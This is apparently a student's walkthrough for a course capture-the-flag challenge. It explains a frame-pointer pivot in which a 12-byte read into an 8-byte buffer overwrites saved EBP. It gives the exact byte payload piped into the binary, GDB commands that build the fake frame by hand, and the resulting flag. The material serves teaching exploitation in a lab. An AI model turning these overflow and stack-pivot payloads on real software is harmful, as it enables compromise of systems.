# Frame Pointer Walkthrough (Learn It By Hand)

This challenge is a frame-pointer pivot, not a format string.

## Core idea
- `buf` is 8 bytes, but `read(0, buf, 12)` writes 12 bytes.
- So you overwrite saved EBP of `vuln()` (not the return address yet).
- Then `caller()` executes `leave; ret`, and uses your fake stack frame from `buf`.
- You place `jump()` as the return target in that fake frame.

Payload layout (12 bytes):
- bytes `0..3`: fake EBP (anything, e.g. `0x41414141`)
- bytes `4..7`: address of `jump()`
- bytes `8..11`: leaked `buf` address (overwrites saved EBP in `vuln`)

## Method 1: True manual terminal method

Use this if you want to do it by hand with no exploit script logic.

1. Disable ASLR for this command (so leaked `buf` is stable):

```bash
cd /home/jbenjam7/cs466/ctf/framepointer
setarch i386 -R ./challenge
```

2. Note both printed addresses:
- `jump() @ 0x08049196`
- `buf @ 0xffffc8bc`  (example)

3. Convert to little-endian bytes:
- `jump`: `0x08049196` -> `\x96\x91\x04\x08`
- `buf`: `0xffffc8bc` -> `\xbc\xc8\xff\xff`

4. Send payload manually:

```bash
printf '\x41\x41\x41\x41\x96\x91\x04\x08\xbc\xc8\xff\xff' | setarch i386 -R ./challenge
```

5. Expected success:

```text
cosc466-flag-{fr4m3}
```

## Method 2: GDB learning method (best for understanding)

This method shows exactly what gets overwritten.

1. Start GDB:

```bash
cd /home/jbenjam7/cs466/ctf/framepointer
gdb -q ./challenge
```

2. Break right after `read` in `vuln` and run:

```gdb
b *vuln+36
run < /dev/null
```

3. Build the fake frame directly in memory:

```gdb
set $buf = $ebp-8
set {int}($buf)   = 0x41414141
set {int}($buf+4) = (int)jump
set {int}$ebp     = $buf
x/4wx $buf
```

You should see values like:
- `$buf[0] = 0x41414141`
- `$buf[1] = jump address`
- saved EBP now equals `$buf`

4. Continue:

gdb c


5. Expected output:

```text
cosc466-flag-{fr4m3}
```

## Optional script method

If you only need a fast solve:

```bash
cd /home/jbenjam7/cs466/ctf/framepointer
./exploit.py
```

## One-line takeaway

You cannot reach `vuln`'s return address with only 12 bytes, so you overwrite `vuln`'s saved EBP and let `caller`'s `leave; ret` pivot into your fake frame in `buf`, then return to `jump()`.
